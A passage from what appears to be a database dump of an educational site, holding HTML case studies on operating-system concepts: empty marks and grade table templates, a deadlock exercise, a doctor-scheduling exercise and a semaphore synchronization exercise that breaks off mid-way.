&quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"150\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 112.7pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"150\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 112.7pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"150\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 112.7pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td></tr></tbody></table></div><div><br></div><div><p class=\"MsoNormal\"><span style=\"font-weight: 700;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 17.12px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Subject<o:p></o:p></span></span></p><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"border: none;\"><tbody><tr><td width=\"208\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 155.7pt; border: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Subject_code<o:p></o:p></span></p></td><td width=\"393\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 295.1pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Subject_title<o:p></o:p></span></p></td></tr><tr><td width=\"208\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 155.7pt; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"393\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 295.1pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td></tr><tr><td width=\"208\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 155.7pt; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"393\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 295.1pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td></tr><tr><td width=\"208\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 155.7pt; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"393\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 295.1pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td></tr></tbody></table><p class=\"MsoNormal\"><span style=\"font-weight: 700;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 17.12px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\"><br></span></span></p><p class=\"MsoNormal\"><span style=\"font-weight: 700;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 17.12px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Grade</span></span></p><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"border: none;\"><tbody><tr><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.25pt; border: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Min_Marks<o:p></o:p></span></p></td><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.25pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Max_Marks<o:p></o:p></span></p></td><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.3pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Grade<o:p></o:p></span></p></td></tr><tr><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.25pt; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.25pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.3pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td></tr><tr><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.25pt; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.25pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.3pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td></tr></tbody></table></div><div><br></div><div><p class=\"MsoNormal\"><span style=\"font-weight: 700;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 17.12px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Exam_Marks</span></span></p><p class=\"MsoNormal\"><span style=\"font-weight: 700;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 17.12px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\"><o:p></o:p></span></span></p><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"border: none;\"><tbody><tr><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.25pt; border: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">RegisterNo<o:p></o:p></span></p></td><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.25pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Subject_code<o:p></o:p></span></p></td><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.3pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Marks<o:p></o:p></span></p></td></tr><tr><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.25pt; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.25pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.3pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td></tr><tr><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.25pt; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.25pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"200\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 150.3pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td></tr></tbody></table></div>','2020-03-21 10:45:38.000000',4,'logo_lb.png'),(8,'Dead Lock Identification','dead-lock-identification','<p class=\"MsoNormal\"><b>Problem Statement:<o:p></o:p></b></p><p>\r\n\r\n</p><p class=\"MsoNormal\" style=\"text-align:justify\">Three Electronic trouble Shooters\r\nnamely Arjun, Ajith and Aravind are working in an Electronic Workshop.\r\nElectronic Workshop has three components those are 1 Multi meter, 1 Soldering\r\nmachine and 1 Screw driver to trouble shoot electronic Products.&nbsp; Arjun holds soldering machine and requires\r\nscrew driver to trouble shoot his product. Ajith holds Screw driver and\r\nrequires no more components to trouble shoot his product. Aravind holds multi\r\nmeter and requires Screw driver to trouble shoot his product. Consider that no\r\ntrouble shooter will release any of his held components without finish his\r\nwork.</p><p class=\"MsoNormal\" style=\"text-align:justify\"><b>Question:</b></p><p class=\"MsoNormal\" style=\"text-align:justify\">1. Will all the three complete\r\ntheir work at last?</p><p class=\"MsoNormal\" style=\"text-align:justify\">\r\n\r\n\r\n\r\n</p><p class=\"MsoNormal\" style=\"text-align:justify\">2. How you Can identify the\r\nanswer for Question 1?</p><p class=\"MsoNormal\" style=\"text-align:justify\">Solution: </p><p class=\"MsoNormal\" style=\"text-align:justify\"><b>Keys:</b></p><p class=\"MsoListParagraph\" style=\"text-align:justify;text-indent:-.25in;\r\nmso-list:l0 level1 lfo1\"><!--[if !supportLists]-->1.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; &nbsp;&nbsp;<span style=\"font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-indent: 0px;\">1.</span>&nbsp;</span><!--[endif]-->Yes\r\nthey will complete their work.</p><p class=\"MsoNormal\" style=\"text-align:justify\">\r\n\r\n\r\n\r\n\r\n\r\n<span style=\"font-size:11.0pt;mso-bidi-font-size:10.0pt;line-height:115%;\r\nfont-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;mso-ascii-theme-font:minor-latin;mso-fareast-font-family:\r\nCalibri;mso-fareast-theme-font:minor-latin;mso-hansi-theme-font:minor-latin;\r\nmso-bidi-font-family:&quot;Times New Roman&quot;;mso-bidi-theme-font:minor-bidi;\r\nmso-ansi-language:EN-US;mso-fareast-language:EN-US;mso-bidi-language:HI\"><span style=\"font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px;\">2.&nbsp;</span>Using\r\nResource Allocation Graph. (IF RAG forms Cycle then there is a dead lock\r\noccurred)</span><br></p>','2022-07-28 12:31:28.000000',6,'logo_ac773e45b008d6616aadbc1a30507760_1x_CQ6UO9Q.png'),(9,'Scheduling Algorithm case Study','scheduling-algorithm-case-study','<p class=\"MsoNormal\" style=\"line-height:150%\"><b><u><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Problem\r\nStatement:<o:p></o:p></span></u></b></p><p>\r\n\r\n</p><p class=\"MsoNormal\" style=\"line-height:150%\"><span style=\"font-size:12.0pt;\r\nline-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">In a hospital Dr. Ravi has\r\nto attend both emergency patients and non emergency out patients. If there is\r\nany one emergency patient he is not suppose to attend out patients. Dr. Ravi\r\nshould also permit Medical representatives to meet him if there are no patients\r\nwaiting for him.</span></p><p class=\"MsoNormal\" style=\"line-height:150%\"><span style=\"font-size:12.0pt;\r\nline-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;<o:p></o:p></span><b><u><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Questions:</span></u></b></p>\r\n\r\n<p class=\"MsoListParagraphCxSpFirst\" style=\"text-indent:-.25in;line-height:150%;\r\nmso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;\r\nline-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-fareast-font-family:\r\n&quot;Times New Roman&quot;\">1.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><!--[endif]--><span style=\"font-size:12.0pt;line-height:150%;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Suggest a right schedule for Dr. Ravi.<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoListParagraphCxSpMiddle\" style=\"text-indent:-.25in;line-height:150%;\r\nmso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;\r\nline-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-fareast-font-family:\r\n&quot;Times New Roman&quot;\">2.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><!--[endif]--><span style=\"font-size:12.0pt;line-height:150%;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Consider there are 2 emergency patients\r\n( first Patient Sick with Severe Viral Fever and<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoListParagraphCxSpLast\" style=\"line-height:150%\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Second\r\none met accident) and few out patients.&nbsp;\r\nHow your scheduling algorithm schedules patients to Dr. Ravi.</span></p><p class=\"MsoNormal\" style=\"line-height:150%\"><b><u><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Solution:\r\n<o:p></o:p></span></u></b></p><p class=\"MsoListParagraphCxSpLast\" style=\"line-height:150%\">\r\n\r\n</p><p class=\"MsoListParagraph\" style=\"text-indent:-.25in;line-height:150%;\r\nmso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;\r\nline-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-fareast-font-family:\r\n&quot;Times New Roman&quot;\">1.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</span></span><!--[endif]--><span style=\"font-size:12.0pt;line-height:150%;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">The most suitable scheduling algorithm\r\nfor the above problem is <b>Multi Level\r\nQueue Scheduling</b>. Each Level of queue can use Different Scheduling\r\nalgorithms.</span></p><p class=\"MsoListParagraph\" style=\"text-indent:-.25in;line-height:150%;\r\nmso-list:l0 level1 lfo1\"><img src=\"/media/django-summernote/2022-07-28/9d1892db-9922-47b2-a2c2-a6d11fba7367.png\" style=\"width: 634px;\"><span style=\"font-size:12.0pt;line-height:150%;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\"><br></span></p><p class=\"MsoListParagraphCxSpFirst\" style=\"text-indent:-.25in;line-height:150%;\r\nmso-list:l0 level1 lfo1;tab-stops:66.0pt\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-fareast-font-family:&quot;Times New Roman&quot;\">1.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; <span style=\"font-size: 12pt;\">&nbsp; 2</span></span></span><span style=\"font-size: 12pt;\">﻿</span><!--[endif]--><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;i. Emergency Patients have highest priority\r\nand out patients have Low Priority. <o:p></o:p></span></p><p class=\"MsoListParagraphCxSpMiddle\" style=\"line-height:150%;tab-stops:30.15pt 66.0pt\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp; &nbsp; ii.\r\nDr. Ravi attends accident patient first then he attends Viral fever patients,\r\nsince &nbsp;&nbsp;Highest priority&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">Queue Using\r\nPriority based scheduling algorithm.</span></p><p class=\"MsoListParagraph\" style=\"text-indent:-.25in;line-height:150%;\r\nmso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;line-height:150%;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">\r\n\r\n\r\n\r\n</span></p><p class=\"MsoListParagraphCxSpLast\" style=\"line-height:150%;tab-stops:66.0pt\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp; &nbsp; iii.\r\nAfter Attending Emergency patients Dr. Ravi attends out patients by first Come\r\nfirst serve method.<o:p></o:p></span></p><p class=\"MsoListParagraph\" style=\"text-indent:-.25in;line-height:150%;\r\nmso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;line-height:150%;\r\nfont-family:&quot;Times New Roman&quot;,&quot;serif&quot;\"><o:p><br></o:p></span></p>','2022-07-28 12:34:28.000000',6,'logo_ac773e45b008d6616aadbc1a30507760_1x_j0yDLRb.png'),(10,'Semaphore for Process Synchornization','semaphore-for-process-synchornization','<p class=\"MsoNormal\" style=\"text-align:justify;text-justify:inter-ideograph\"><b><u><span style=\"font-size:12.0pt;\r\nline-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Problem Statement:<o:p></o:p></span></u></b></p><p class=\"MsoNormal\" style=\"text-align:justify;text-justify:inter-ideograph\"><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">A\r\nfactory has few machines which are used for manufacturing sheet metal products.\r\nOperator, Cleaner and mechanic are the 3 users who access those machines.\r\nOperator runs the machine to produce sheet metal products; mechanic trouble\r\nshoots the machine or performs daily maintenance work on machine. Cleaner\r\ncleans the machine and fills lubrication oil on machine.<o:p></o:p></span></p><p>\r\n\r\n\r\n\r\n</p><p class=\"MsoNormal\" style=\"text-align:justify;text-justify:inter-ideograph\"><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;Any user is restricted to do their work on the\r\nmachine when another user doing their work on the same machine. For example\r\nOperator should not run the machine while either mechanic trouble shooting the\r\nmachine or cleaner cleaning the machine.</span></p><p class=\"MsoNormal\" style=\"text-align:justify;text-justify:inter-ideograph\"><b><u><span style=\"font-size:12.0pt;\r\nline-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Questions :<o:p></o:p></span></u></b></p><p class=\"MsoListParagraphCxSpFirst\" style=\"text-align:justify;text-justify:inter-ideograph;\r\ntext-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-fareast-font-family:&quot;Times New Roman&quot;\">1.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">How\r\nyou synchronize the users of machine? <o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align:justify;text-justify:inter-ideograph\">\r\n\r\n\r\n\r\n</p><p class=\"MsoListParagraphCxSpLast\" style=\"text-align:justify;text-justify:inter-ideograph;\r\ntext-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-fareast-font-family:&quot;Times New Roman&quot;\">2.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Design\r\nan algorithm for the Synchronization Problem.</span></p><p class=\"MsoNormal\" style=\"text-align:justify;text-justify:inter-ideograph\"><b><u><span style=\"font-size:12.0pt;\r\nline-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Solution:<o:p></o:p></span></u></b></p><p class=\"MsoListParagraphCxSpFirst\" style=\"text-align:justify;text-justify:inter-ideograph;\r\ntext-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-fareast-font-family:&quot;Times New Roman&quot;\">1.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Semaphore\r\ninteger variable <b>Machine_free</b> is\r\nused to solve the synchronization problem.<o:p></o:p></span></p><p class=\"MsoListParagraphCxSpMiddle\" style=\"text-align:justify;text-justify:\r\ninter-ideograph;text-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-fareast-font-family:&quot;Times New Roman&quot;\">2.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">If\r\n<b>Machine_free</b> value is equal to 1\r\nthen Machine is not used by any user, so requested user can access the machine\r\nfor their work.<o:p></o:p></span></p><p class=\"MsoListParagraphCxSpLast\" style=\"text-align:justify;text-justify:inter-ideograph;\r\ntext-indent:-.25in;mso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">\r\n\r\n\r\n\r\n\r\n\r\n</span></p><p class=\"MsoListParagraphCxSpLast\" style=\"text-align:justify;text-justify:inter-ideograph;\r\ntext-indent:-.25in;mso-list:l0 level1 lfo1\"><!--[if !supportLists]--><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-fareast-font-family:&quot;Times New Roman&quot;\">3.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><!--[endif]--><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">If\r\nits value is less than 1 then some user working on machine so another requested\r\nuser should wait.</span></p><p class=\"MsoNormal\" style=\"text-align:justify;text-justify:inter-ideograph\"><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Class\r\nmachine_synchornize;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align:justify;text-justify:inter-ideograph\"><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">{<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align:justify;text-justify:inter-ideograph\"><span 